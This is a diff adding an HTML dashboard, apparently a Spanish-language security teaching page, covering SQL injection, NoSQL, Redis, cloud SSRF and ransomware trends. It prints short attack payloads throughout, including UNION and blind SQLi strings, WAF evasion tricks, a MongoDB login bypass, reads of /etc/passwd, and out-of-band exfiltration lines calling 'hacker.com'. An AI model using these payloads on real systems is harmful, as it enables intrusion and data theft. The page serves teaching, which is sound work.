@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IsaBosDev - Plataforma de Investigación de Seguridad</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/svg+xml" href="favicon_32X32.svg">
+    
+    <!-- External Dependencies -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    
+    <!-- Custom Styles -->
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <!-- ==========================================
+         HEADER - Sticky navigation with logo and main tabs
+         ========================================== -->
+    <header class="border-b sticky top-0 z-50 backdrop-blur-md" style="background-color: var(--bg-primary); opacity: 0.95; border-color: var(--text-tertiary);">
+        <div class="max-w-full mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex flex-col xl:flex-row justify-between items-center py-3">
+                <!-- Site Title with Logo -->
+                <div class="flex items-center gap-3">
+                    <img src="favicon_32X32.svg" alt="IsaBosDev Logo" class="w-8 h-8">
+                    <div>
+                        <h1 class="text-lg font-bold tracking-tight leading-none" style="color: var(--text-primary);">IsaBosDev <span style="color: var(--color-primary);">Security Research</span></h1>
+                        <p class="text-[10px] font-mono" style="color: var(--text-secondary);">Full Spectrum Data Threats</p>
+                    </div>
+                </div>
+                
+                <!-- Main Navigation Tabs -->
+                <nav class="w-full xl:w-auto overflow-x-auto no-scrollbar">
+                    <div class="flex space-x-6 min-w-max px-2" id="main-nav">
+                        <button data-tab="inicio" class="nav-item py-3 text-xs font-bold uppercase tracking-wider active">Dashboard</button>
+                        <button data-tab="sqli" class="nav-item py-3 text-xs font-bold uppercase tracking-wider">SQLi Master</button>
+                        <button data-tab="nosql" class="nav-item py-3 text-xs font-bold uppercase tracking-wider">NoSQL & Modern</button>
+                        <button data-tab="ransomware" class="nav-item py-3 text-xs font-bold uppercase tracking-wider">Ransomware</button>
+                        <button data-tab="cloud" class="nav-item py-3 text-xs font-bold uppercase tracking-wider">Cloud & API</button>
+                        <button data-tab="infra" class="nav-item py-3 text-xs font-bold uppercase tracking-wider">Infra Física/Red</button>
+                        <button data-tab="herramientas" class="nav-item py-3 text-xs font-bold uppercase tracking-wider">Arsenal</button>
+                        <button data-tab="mitigacion" class="nav-item py-3 text-xs font-bold uppercase tracking-wider" style="color: var(--color-secondary);">Defensa</button>
+                    </div>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <!-- ==========================================
+         MAIN CONTENT - Tab-based sections
+         ========================================== -->
+    <main id="content-container" class="flex-grow w-full max-w-7xl mx-auto p-4 sm:p-6 lg:p-8">
+
+        <!-- SECTION 1: Dashboard Overview -->
+        <section id="inicio" class="tab-content animate-fade-in">
+            <div class="glass-card p-8 rounded-xl border-l-4 mb-8" style="border-color: var(--color-primary);">
+                <h2 class="text-3xl font-bold mb-4" style="color: var(--text-primary);">Inteligencia de Amenazas 2025</h2>
+                <p class="mb-6" style="color: var(--text-primary);">
+                    Este informe interactivo fusiona el conocimiento de ataques a servidores de datos con las últimas tendencias de ciberseguridad. 
+                    Desde la persistencia de la <strong>Inyección SQL</strong> hasta la sofisticación de la <strong>Triple Extorsión</strong> en Ransomware y los riesgos emergentes en <strong>Cloud y APIs</strong>.
+                </p>
+                
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <div class="p-4 rounded border" style="background-color: var(--bg-secondary); border-color: var(--text-tertiary);">
+                        <div class="font-bold text-lg mb-1 text-primary-color">Vector Clásico</div>
+                        <p class="text-xs" style="color: var(--text-secondary);">SQLi sigue siendo el 10% de vulnerabilidades críticas en código cerrado.</p>
+                    </div>
+                    <div class="p-4 rounded border" style="background-color: var(--bg-secondary); border-color: var(--text-tertiary);">
+                        <div class="font-bold text-lg mb-1 text-secondary-color">Vector Moderno</div>
+                        <p class="text-xs" style="color: var(--text-secondary);">Ransomware as a Service (RaaS) y ataques a la cadena de suministro.</p>
+                    </div>
+                    <div class="p-4 rounded border" style="background-color: var(--bg-secondary); border-color: var(--text-tertiary);">
+                        <div class="font-bold text-lg mb-1 text-accent-color">Vector Futuro</div>
+                        <p class="text-xs" style="color: var(--text-secondary);">Inyecciones impulsadas por IA, ataques BOLA en APIs y SSRF en Nube.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                 <div class="glass-card p-6 rounded-xl flex flex-col justify-center items-center text-center">
+                    <h3 class="text-lg font-semibold mb-2" style="color: var(--text-primary);">Evolución de Amenazas</h3>
+                    <div class="w-full h-64 relative">
+                        <canvas id="evolutionChart"></canvas>
+                    </div>
+                </div>
+                 <div class="glass-card p-6 rounded-xl">
+                    <h3 class="text-lg font-semibold mb-4" style="color: var(--text-primary);">Conceptos Clave 2025</h3>
+                    <ul class="space-y-3 text-sm" style="color: var(--text-secondary);">
+                        <li class="flex items-start"><span class="mr-2 text-primary-color">▸</span> <strong>Triple Extorsión:</strong> Cifrado + Robo + Ataque DDoS/Acoso a clientes.</li>
+                        <li class="flex items-start"><span class="mr-2 text-primary-color">▸</span> <strong>OOB SQLi:</strong> Extracción de datos vía canales alternativos (DNS/HTTP) cuando no hay respuesta visual.</li>
+                        <li class="flex items-start"><span class="mr-2 text-primary-color">▸</span> <strong>BOLA (API):</strong> Acceso a objetos de otros usuarios manipulando IDs en APIs REST.</li>
+                         <li class="flex items-start"><span class="mr-2 text-primary-color">▸</span> <strong>Second-Order SQLi:</strong> El payload se guarda durmiente y se ejecuta en una consulta futura.</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 2: SQL Injection Techniques -->
+        <section id="sqli" class="tab-content hidden">
+            <div class="flex flex-col lg:flex-row gap-8">
+                <!-- Sidebar Sub-Navigation -->
+                <div class="lg:w-64 flex-shrink-0 space-y-1">
+                    <div class="text-xs font-bold uppercase tracking-wider mb-3 px-2" style="color: var(--text-secondary);">Técnicas de Inyección</div>
+                    <button data-sub="sqli-types" class="sqli-btn w-full text-left px-4 py-3 rounded-lg text-sm active-sub">Tipos Fundamentales</button>
+                    <button data-sub="sqli-fingerprint" class="sqli-btn w-full text-left px-4 py-3 rounded-lg text-sm">Identificación BD</button>
+                    <button data-sub="sqli-arithmetic" class="sqli-btn w-full text-left px-4 py-3 rounded-lg text-sm">Aritmética & Lógica</button>
+                    <button data-sub="sqli-files" class="sqli-btn w-full text-left px-4 py-3 rounded-lg text-sm">Archivos (RFD)</button>
+                    <button data-sub="sqli-advanced" class="sqli-btn w-full text-left px-4 py-3 rounded-lg text-sm">Avanzado (OOB/2nd Order)</button>
+                    <button data-sub="sqli-waf" class="sqli-btn w-full text-left px-4 py-3 rounded-lg text-sm">Evasión de WAF</button>
+                </div>
+
+                <!-- Content Area -->
+                <div class="flex-grow glass-card p-8 rounded-2xl min-h-[600px]">
+                    
+                    <!-- SQLi Types: In-Band, Error-Based, Blind -->
+                    <div id="sqli-types" class="sqli-content animate-fade-in">
+                        <div class="flex items-center mb-6">
+                            <div class="p-2 rounded mr-3 text-primary-color" style="background-color: rgba(0, 176, 240, 0.2);"><i data-lucide="layers"></i></div>
+                            <h3 class="text-2xl font-bold" style="color: var(--text-primary);">Fundamentos de Inyección</h3>
+                        </div>
+                        
+                        <div class="space-y-6">
+                            <div class="border-l-2 pl-4" style="border-color: var(--color-success);">
+                                <h4 class="text-lg font-bold" style="color: var(--color-success);">In-Band (UNION Based)</h4>
+                                <p class="text-sm mb-2" style="color: var(--text-secondary);">La más rápida. Los datos robados aparecen directamente en la pantalla de la aplicación.</p>
+                                <div class="code-block p-3 rounded text-xs">
+                                    http://web.com?id=1 UNION SELECT username, password FROM users--
+                                </div>
+                            </div>
+
+                            <div class="border-l-2 pl-4" style="border-color: var(--color-warning);">
+                                <h4 class="text-lg font-bold" style="color: var(--color-warning);">Error-Based</h4>
+                                <p class="text-sm mb-2" style="color: var(--text-secondary);">Se fuerza un error de sintaxis o conversión que "escupe" los datos internos en el mensaje de error.</p>
+                                <div class="code-block p-3 rounded text-xs">
+                                    ... CAST((SELECT password FROM users LIMIT 1) AS int) ...
+                                    <br><span style="color: var(--color-error);">Error: Conversion failed when converting the varchar value 'P@ssw0rd123' to data type int.</span>
+                                </div>
+                            </div>
+
+                            <div class="border-l-2 pl-4" style="border-color: var(--color-error);">
+                                <h4 class="text-lg font-bold" style="color: var(--color-error);">Blind (Ciega)</h4>
+                                <p class="text-sm mb-2" style="color: var(--text-secondary);">No hay salida visual. Se infiere información bit a bit.</p>
+                                <ul class="space-y-2 mt-2">
+                                    <li class="text-xs p-2 rounded bg-tertiary">
+                                        <strong style="color: var(--text-primary);">Booleana:</strong> Si la página carga normal, la condición es TRUE.
+                                        <br><code style="color: var(--text-tertiary);">id=1 AND (SELECT substring(pass,1,1))='a'</code>
+                                    </li>
+                                    <li class="text-xs p-2 rounded bg-tertiary">
+                                        <strong style="color: var(--text-primary);">Time-Based:</strong> Si la página tarda 10 segundos, la condición es TRUE.
+                                        <br><code style="color: var(--text-tertiary);">id=1'; IF (1=1) WAITFOR DELAY '0:0:10'--</code>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Database Fingerprinting Techniques -->
+                    <div id="sqli-fingerprint" class="sqli-content hidden animate-fade-in">
+                        <div class="flex items-center mb-6">
+                            <div class="p-2 rounded mr-3 text-secondary-color" style="background-color: rgba(216, 110, 204, 0.2);"><i data-lucide="fingerprint"></i></div>
+                            <h3 class="text-2xl font-bold" style="color: var(--text-primary);">Identificación de Base de Datos</h3>
+                        </div>
+                        <p class="text-sm mb-6" style="color: var(--text-primary);">Para atacar con éxito, primero hay que saber qué motor estamos atacando. Cada uno habla un "dialecto" SQL distinto.</p>
+
+                        <div class="overflow-hidden rounded-xl border mb-6" style="border-color: var(--text-tertiary);">
+                            <table class="w-full text-sm text-left" style="color: var(--text-secondary);">
+                                <thead class="text-xs uppercase bg-tertiary" style="color: var(--text-primary);">
+                                    <tr>
+                                        <th class="px-6 py-3">Prueba</th>
+                                        <th class="px-6 py-3 text-primary-color">Oracle</th>
+                                        <th class="px-6 py-3 text-secondary-color">Microsoft SQL</th>
+                                        <th class="px-6 py-3" style="color: var(--color-success);">MySQL</th>
+                                    </tr>
+                                </thead>
+                                <tbody class="divide-y" style="background-color: rgba(15, 23, 42, 0.5); border-color: var(--text-tertiary);">
+                                    <tr>
+                                        <td class="px-6 py-4 font-medium" style="color: var(--text-primary);">Versión</td>
+                                        <td class="px-6 py-4 font-mono text-xs">SELECT banner FROM v$version</td>
+                                        <td class="px-6 py-4 font-mono text-xs">SELECT @@version</td>
+                                        <td class="px-6 py-4 font-mono text-xs">SELECT version()</td>
+                                    </tr>
+                                    <tr>
+                                        <td class="px-6 py-4 font-medium" style="color: var(--text-primary);">Concatenación</td>
+                                        <td class="px-6 py-4 font-mono text-xs">'a'||'b'</td>
+                                        <td class="px-6 py-4 font-mono text-xs">'a'+'b'</td>
+                                        <td class="px-6 py-4 font-mono text-xs">CONCAT('a','b')</td>
+                                    </tr>
+                                    <tr>
+                                        <td class="px-6 py-4 font-medium" style="color: var(--text-primary);">Tablas Sistema</td>
+                                        <td class="px-6 py-4 font-mono text-xs">all_tables</td>
+                                        <td class="px-6 py-4 font-mono text-xs">sysobjects</td>
+                                        <td class="px-6 py-4 font-mono text-xs">information_schema</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+
+                    <!-- Arithmetic & Logic Blind SQLi -->
+                    <div id="sqli-arithmetic" class="sqli-content hidden animate-fade-in">
+                        <div class="flex items-center mb-6">
+                            <div class="p-2 rounded mr-3" style="color: var(--color-warning); background-color: rgba(250, 204, 21, 0.2);"><i data-lucide="calculator"></i></div>
+                            <h3 class="text-2xl font-bold" style="color: var(--text-primary);">Inyección Aritmética Ciega</h3>
+                        </div>
+                        <p class="text-sm mb-4" style="color: var(--text-primary);">
+                            Cuando los operadores lógicos (AND/OR) están filtrados o causan errores de sintaxis complejos, usamos matemáticas para inferir datos.
+                        </p>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                            <div class="p-5 rounded-xl border" style="background-color: var(--bg-secondary); border-color: var(--text-tertiary);">
+                                <h4 class="font-bold mb-2" style="color: var(--text-primary);">División por Cero</h4>
+                                <p class="text-xs mb-3" style="color: var(--text-secondary);">Si la condición es cierta, provocamos un error matemático.</p>
+                                <div class="code-block p-3 rounded text-xs mb-2">
+                                    id = 3 - (0 / (SELECT ...condición...))
+                                </div>
+                                <ul class="text-[10px] list-disc pl-3" style="color: var(--text-tertiary);">
+                                    <li>Si condición devuelve 0 (FALSE) -> 3 - (0/0) -> <span style="color: var(--color-error);">ERROR</span></li>
+                                    <li>Si condición devuelve 1 (TRUE) -> 3 - (0/1) -> 3 -> <span style="color: var(--color-success);">OK</span></li>
+                                </ul>
+                            </div>
+                            
+                            <div class="p-5 rounded-xl border" style="background-color: var(--bg-secondary); border-color: var(--text-tertiary);">
+                                <h4 class="font-bold mb-2" style="color: var(--text-primary);">Desbordamiento (Overflow)</h4>
+                                <p class="text-xs mb-3" style="color: var(--text-secondary);">Provocar error excediendo la capacidad numérica.</p>
+                                <div class="code-block p-3 rounded text-xs">
+                                    ... * 99999999999999999999 ...
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Remote File Download (RFD) Attacks -->
+                    <div id="sqli-files" class="sqli-content hidden animate-fade-in">
+                        <div class="flex items-center mb-6">
+                            <div class="p-2 rounded mr-3 bg-secondary-soft text-secondary-color"><i data-lucide="file-warning"></i></div>
+                            <h3 class="text-2xl font-bold" style="color: var(--text-primary);">Descarga Remota de Archivos (RFD)</h3>
+                        </div>
+                        <p class="text-sm mb-6" style="color: var(--text-primary);">Abuso de privilegios de base de datos para leer archivos sensibles del Sistema Operativo (<code>/etc/passwd</code>, <code>boot.ini</code>).</p>
+                        
+                        <div class="space-y-6">
+                            <div class="p-4 rounded-xl gradient-primary-horizontal border-l-4 border-primary-color">
+                                <h4 class="text-primary-color font-bold mb-2">Microsoft SQL Server (OLE DB)</h4>
+                                <div class="code-block p-3 rounded text-xs">
+                                    SELECT * FROM OpenRowSet('MSDASQL', 'Driver={Microsoft Text Driver (*.txt)};DefaultDir=C:\;', 'select * from password.txt')
+                                </div>
+                                <p class="text-[10px] mt-2" style="color: var(--text-secondary);">Requiere configuración <code>DisallowAd-hocAccess = 0</code>.</p>
+                            </div>
+                            
+                                      <div class="p-4 rounded-xl gradient-success-horizontal border-l-4 border-success">
+                                          <h4 class="font-bold mb-2 text-success">MySQL (Load File)</h4>
+                                <div class="code-block p-3 rounded text-xs mb-2">
+                                    SELECT Load_File('/etc/passwd')
+                                </div>
+                                <p class="text-[10px]" style="color: var(--text-secondary);">Alternativa: <code>LOAD DATA INFILE</code> para volcar contenido a una tabla temporal y luego leerla.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Advanced: Out-of-Band & Second-Order SQLi -->
+                    <div id="sqli-advanced" class="sqli-content hidden animate-fade-in">
+                         <div class="flex items-center mb-6">
+                            <div class="p-2 rounded mr-3" style="color: var(--color-error); background-color: rgba(248, 113, 113, 0.2);"><i data-lucide="skull"></i></div>
+                            <h3 class="text-2xl font-bold" style="color: var(--text-primary);">Técnicas Avanzadas</h3>
+                        </div>
+
+                        <div class="grid grid-cols-1 gap-6">
+                            <div class="p-6 rounded-xl relative overflow-hidden bg-tertiary">
+                                <div class="absolute top-0 right-0 text-xs font-bold px-3 py-1" style="background-color: var(--color-primary); color: var(--bg-primary);">Crítico</div>
+                                <h4 class="font-bold text-lg mb-2" style="color: var(--text-primary);">Out-of-Band (OOB)</h4>
+                                <p class="text-sm mb-4" style="color: var(--text-secondary);">
+                                    Cuando la inyección es ciega total y el tiempo es inestable. Forzamos al servidor DB a conectarse a nosotros (DNS/HTTP).
+                                </p>
+                                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                    <div class="code-block p-3 rounded text-xs">
+                                        <span class="block mb-1" style="color: var(--text-secondary);">-- Oracle (HTTP)</span>
+                                        SELECT UTL_HTTP.REQUEST('http://hacker.com/'||pass) FROM users;
+                                    </div>
+                                    <div class="code-block p-3 rounded text-xs">
+                                        <span class="block mb-1" style="color: var(--text-secondary);">-- MSSQL (DNS/SMB)</span>
+                                        xp_dirtree '\\hacker.com\share'
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="p-6 rounded-xl bg-tertiary">
+                                <h4 class="font-bold text-lg mb-2" style="color: var(--text-primary);">Second-Order SQLi</h4>
+                                <p class="text-sm mb-2" style="color: var(--text-secondary);">
+                                    El ataque durmiente. Inyectamos el payload al crear un usuario (ej. <code>admin'--</code>). No pasa nada.
+                                    El ataque se detona días después, cuando un administrador revisa ese usuario y la aplicación usa el nombre almacenado en otra consulta insegura.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
+                     <!-- WAF Evasion Techniques -->
+                    <div id="sqli-waf" class="sqli-content hidden animate-fade-in">
+                         <div class="flex items-center mb-6">
+                            <div class="p-2 rounded mr-3 bg-warning-soft text-warning"><i data-lucide="shield-alert"></i></div>
+                            <h3 class="text-2xl font-bold" style="color: var(--text-primary);">Evasión de WAF</h3>
+                        </div>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div class="p-4 rounded border" style="background-color: var(--bg-primary); border-color: var(--text-tertiary);">
+                                <h5 class="text-primary-color font-bold text-sm mb-2">HPP (Parameter Pollution)</h5>
+                                <p class="text-xs" style="color: var(--text-secondary);">Enviar el mismo parámetro dos veces. WAF lee uno, backend lee otro.</p>
+                                <code class="block mt-2 text-xs p-2 rounded" style="color: var(--text-primary); background-color: var(--bg-code);">id=1&id=UNION SELECT...</code>
+                            </div>
+                            <div class="p-4 rounded border" style="background-color: var(--bg-primary); border-color: var(--text-tertiary);">
+                                <h5 class="text-primary-color font-bold text-sm mb-2">Ofuscación de Espacios</h5>
+                                <p class="text-xs" style="color: var(--text-secondary);">Reemplazar espacios por comentarios o saltos de línea.</p>
+                                <code class="block mt-2 text-xs p-2 rounded" style="color: var(--text-primary); background-color: var(--bg-code);">SELECT/**/user/**/FROM/**/users</code>
+                            </div>
+                            <div class="p-4 rounded border" style="background-color: var(--bg-primary); border-color: var(--text-tertiary);">
+                                <h5 class="text-primary-color font-bold text-sm mb-2">Fragmentación JSON</h5>
+                                <p class="text-xs" style="color: var(--text-secondary);">Dividir payloads en estructuras JSON anidadas que el WAF no procesa.</p>
+                            </div>
+                            <div class="p-4 rounded border" style="background-color: var(--bg-primary); border-color: var(--text-tertiary);">
+                                <h5 class="text-primary-color font-bold text-sm mb-2">Codificación Rara</h5>
+                                <p class="text-xs" style="color: var(--text-secondary);">Uso de IBM EBCDIC o UTF-7 si la base de datos lo soporta.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 3: NoSQL & Modern Databases -->
+        <section id="nosql" class="tab-content hidden animate-fade-in">
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                <!-- MongoDB Injection Attacks -->
+                <div class="glass-card p-6 rounded-xl border-t-4" style="border-color: var(--color-success);">
+                    <div class="flex justify-between mb-4">
+                        <h3 class="text-xl font-bold" style="color: var(--text-primary);">MongoDB</h3>
+                        <span class="px-2 py-1 bg-success-soft text-success text-xs rounded">Document Store</span>
+                    </div>
+                    
+                    <div class="space-y-4">
+                        <div class="p-4 rounded-lg" style="background-color: var(--bg-primary);">
+                            <h4 class="text-sm font-bold mb-2" style="color: var(--text-primary);">Bypass de Login (PHP)</h4>
+                            <p class="text-xs mb-2" style="color: var(--text-secondary);">PHP convierte arrays en objetos JSON query.</p>
+                            <div class="code-block p-2 rounded text-xs">
+                                user=admin&pass[$ne]=1
+                            </div>
+                            <p class="text-[10px] mt-1" style="color: var(--text-secondary);">Consulta: password "NOT EQUAL" 1 -> TRUE.</p>
+                        </div>
+
+                        <div class="p-4 rounded-lg" style="background-color: var(--bg-primary);">
+                            <h4 class="text-sm font-bold mb-2" style="color: var(--text-primary);">Inyección JavaScript ($where)</h4>
+                            <p class="text-xs mb-2" style="color: var(--text-secondary);">Ejecución de código arbitrario en el servidor DB.</p>
+                            <div class="code-block p-2 rounded text-xs">
+                                '; while(1); //
+                            </div>
+                            <p class="text-[10px] mt-1" style="color: var(--text-secondary);">Ataque de Denegación de Servicio (DoS).</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Redis CRLF Injection & GraphQL Attacks -->
+                <div class="glass-card p-6 rounded-xl border-t-4" style="border-color: var(--color-error);">
+                    <div class="flex justify-between mb-4">
+                        <h3 class="text-xl font-bold" style="color: var(--text-primary);">Redis & GraphQL</h3>
+                        <span class="px-2 py-1 bg-error-soft text-error text-xs rounded">In-Memory & API</span>
+                    </div>
+
+                    <div class="space-y-4">
+                        <div class="p-4 rounded-lg relative" style="background-color: var(--bg-primary);">
+                            <div class="absolute top-2 right-2 text-error text-xs font-bold">RCE</div>
+                            <h4 class="text-sm font-bold mb-1" style="color: var(--text-primary);">Redis Injection</h4>
+                            <p class="text-xs mb-2" style="color: var(--text-secondary);">Redis a menudo corre como root sin pass. Inyectar saltos de línea (CRLF) permite ejecutar comandos.</p>
+                            <div class="code-block p-2 rounded text-[10px]">
+                                SET backup_file /root/.ssh/authorized_keys
+                            </div>
+                        </div>
+
+                        <div class="p-4 rounded-lg" style="background-color: var(--bg-primary);">
+                            <h4 class="text-sm font-bold mb-1" style="color: var(--text-primary);">GraphQL</h4>
+                            <ul class="text-xs space-y-1 list-disc pl-4" style="color: var(--text-secondary);">
+                                <li><strong>Introspection:</strong> Consultar <code>__schema</code> revela toda la estructura.</li>
+                                <li><strong>Batching:</strong> 1000 queries en una petición (DoS/BruteForce).</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                 <!-- Directory/Path Traversal Attack -->
+                <div class="glass-card p-6 rounded-xl lg:col-span-2">
+                    <h3 class="text-xl font-bold text-primary-color mb-2">Path Traversal</h3>
+                    <p class="text-xs mb-4" style="color: var(--text-secondary);">Acceso fuera del directorio web.</p>
+                    <div class="flex items-center justify-between p-4 rounded border" style="background-color: var(--bg-secondary); border-color: var(--text-tertiary);">
+                        <div class="text-xs" style="color: var(--text-secondary);">http://app.com/file?name=report.pdf</div>
+                        <div class="font-bold px-2" style="color: var(--text-primary);">➜</div>
+                        <div class="text-xs" style="color: var(--color-error);">http://app.com/file?name=../../../../etc/passwd</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 4: Ransomware Evolution -->
+        <section id="ransomware" class="tab-content hidden animate-fade-in">
+             <div class="glass-card p-8 rounded-2xl mb-8 border-t-4 border-error relative overflow-hidden">
+                <div class="absolute top-0 right-0 p-4 opacity-10"><i data-lucide="biohazard" size="100"></i></div>
+                <h2 class="text-3xl font-bold mb-4" style="color: var(--text-primary);">Evolución del Ransomware</h2>
+                <p class="text-sm max-w-2xl" style="color: var(--text-primary);">
+                    Del cifrado simple a la extorsión psicológica. Los grupos de ransomware modernos operan como multinacionales del crimen (RaaS).
+                </p>
+            </div>
+
+            <!-- Timeline: Simple Encryption -> Double -> Triple Extortion -->
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
+                <div class="p-5 rounded-xl gradient-depth-vertical border border-tertiary">
+                    <div class="text-xs font-bold mb-2" style="color: var(--text-secondary);">FASE 1 (2013-2017)</div>
+                    <h3 class="font-bold text-lg mb-2" style="color: var(--text-primary);">Cifrado Masivo</h3>
+                    <p class="text-xs mb-3" style="color: var(--text-secondary);">Cryptolocker, Wannacry. Objetivo: Bloquear sistemas.</p>
+                </div>
+                <div class="p-5 rounded-xl gradient-depth-vertical border border-primary-color">
+                    <div class="text-primary-color text-xs font-bold mb-2">FASE 2 (2019+)</div>
+                    <h3 class="font-bold text-lg mb-2" style="color: var(--text-primary);">Doble Extorsión</h3>
+                    <p class="text-xs mb-3" style="color: var(--text-secondary);">Maze, REvil. Antes de cifrar, roban los datos y amenazan con publicarlos.</p>
+                </div>
+                <div class="p-5 rounded-xl gradient-depth-vertical border border-error">
+                    <div class="text-error text-xs font-bold mb-2">FASE 3 (2024+)</div>
+                    <h3 class="font-bold text-lg mb-2" style="color: var(--text-primary);">Triple Extorsión</h3>
+                    <p class="text-xs mb-3" style="color: var(--text-secondary);">BlackCat, LockBit. Cifrado + Robo + <strong>DDoS</strong> a la víctima o llamadas a sus clientes.</p>
+                </div>
+            </div>
+
+            <!-- Real-World Case Studies -->
+            <div class="glass-card p-6 rounded-xl">
+                <h3 class="text-lg font-bold mb-4" style="color: var(--text-primary);">Casos de Estudio Reales</h3>
+                <div class="space-y-4">
+                    <div class="flex items-start">
+                        <div class="w-2 h-2 rounded-full bg-error mt-2 mr-3"></div>
+                        <div>
+                            <h4 class="text-sm font-bold" style="color: var(--text-primary);">Oficina de Desempleo de Washington (2021)</h4>
+                            <p class="text-xs" style="color: var(--text-secondary);">1.6 millones de registros robados mediante una Inyección SQL en un componente legado (Accellion). Demuestra la vigencia de SQLi.</p>
+                        </div>
+                    </div>
+                    <div class="flex items-start">
+                        <div class="w-2 h-2 rounded-full bg-error mt-2 mr-3"></div>
+                        <div>
+                            <h4 class="text-sm font-bold" style="color: var(--text-primary);">NotPetya (2017)</h4>
+                            <p class="text-xs" style="color: var(--text-secondary);">Ciberarma disfrazada de ransomware. Usó el exploit EternalBlue (SMB) y Mimikatz para destruir infraestructuras globales.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 5: Cloud & API Security -->
+        <section id="cloud" class="tab-content hidden animate-fade-in">
+            <div class="glass-card p-8 rounded-2xl mb-6 border-b-4 border-secondary-color">
+                <h2 class="text-3xl font-bold mb-4" style="color: var(--text-primary);">Vectores Cloud & API</h2>
+                <p class="text-sm" style="color: var(--text-primary);">La nube elimina perímetros. La identidad es el nuevo firewall.</p>
+            </div>
+
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                <!-- SSRF Attack on Cloud Metadata API -->
+                <div class="p-6 rounded-xl relative group hover-bg transition-colors bg-tertiary">
+                    <div class="absolute top-4 right-4 text-secondary-color opacity-50 group-hover:opacity-100"><i data-lucide="server-cog"></i></div>
+                    <h3 class="font-bold mb-2" style="color: var(--text-primary);">SSRF en Cloud</h3>
+                    <p class="text-xs mb-4" style="color: var(--text-secondary);">Engañar al servidor para acceder a la API de metadatos interna.</p>
+                    <code class="block p-2 rounded text-[10px] text-secondary-color mb-2" style="background-color: var(--bg-code);">http://169.254.169.254/latest/meta-data/</code>
+                    <p class="text-xs" style="color: var(--text-secondary);">Devuelve credenciales temporales (IAM Roles) para robar la cuenta AWS.</p>
+                </div>
+
+                <!-- S3/Blob Storage Misconfiguration -->
+                <div class="p-6 rounded-xl relative group hover-bg transition-colors bg-tertiary">
+                    <div class="absolute top-4 right-4 text-secondary-color opacity-50 group-hover:opacity-100"><i data-lucide="box"></i></div>
+                    <h3 class="font-bold mb-2" style="color: var(--text-primary);">Buckets Públicos</h3>
+                    <p class="text-xs mb-4" style="color: var(--text-secondary);">Configuraciones erróneas en S3/Azure Blob.</p>
+                    <p class="text-xs" style="color: var(--text-secondary);">Permitir lectura a "Authenticated Users" (cualquier usuario de AWS) causa fugas masivas.</p>
+                </div>
+
+                <!-- BOLA (Broken Object Level Authorization) -->
+                <div class="p-6 rounded-xl relative group hover-bg transition-colors bg-tertiary">
+                    <div class="absolute top-4 right-4 text-secondary-color opacity-50 group-hover:opacity-100"><i data-lucide="globe"></i></div>
+                    <h3 class="font-bold mb-2" style="color: var(--text-primary);">API: BOLA</h3>
+                    <p class="text-xs mb-4" style="color: var(--text-secondary);">Broken Object Level Authorization (IDOR en APIs).</p>
+                    <div class="flex flex-col space-y-1">
+                        <code class="block p-1 rounded text-[10px]" style="color: var(--color-success); background-color: var(--bg-code);">GET /api/user/100 (Mío)</code>
+                        <code class="block p-1 rounded text-[10px]" style="color: var(--color-error); background-color: var(--bg-code);">GET /api/user/101 (Tuyo)</code>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 6: Physical & Network Infrastructure -->
+        <section id="infra" class="tab-content hidden animate-fade-in">
+            <div class="glass-card p-8 rounded-2xl mb-6">
+                <h2 class="text-2xl font-bold mb-4" style="color: var(--text-primary);">Infraestructura Física y de Red</h2>
+                <p class="text-sm" style="color: var(--text-primary);">Antes de la nube, estos eran los vectores principales. Siguen siendo críticos en entornos híbridos y on-premise.</p>
+            </div>
+
+            <div class="space-y-4">
+                <!-- Physical Access Threats -->
+                <div class="flex items-start p-4 rounded-xl border bg-tertiary" style="border-color: var(--text-tertiary);">
+                    <div class="p-3 rounded-lg mr-4" style="background-color: var(--bg-secondary); color: var(--text-primary);"><i data-lucide="hard-drive"></i></div>
+                    <div>
+                        <h4 class="font-bold" style="color: var(--text-primary);">Acceso y Seguridad Física</h4>
+                        <p class="text-xs mt-1" style="color: var(--text-secondary);">
+                            Si un atacante accede físicamente al servidor, puede robar discos duros o instalar keyloggers. El robo de cintas de backup es también un riesgo crítico.
+                            <br><span class="text-primary-color font-semibold">Mitigación:</span> Cifrado de datos en reposo (TDE), controles biométricos y vigilancia.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Network Traffic Interception (Sniffing) -->
+                <div class="flex items-start p-4 rounded-xl border bg-tertiary" style="border-color: var(--text-tertiary);">
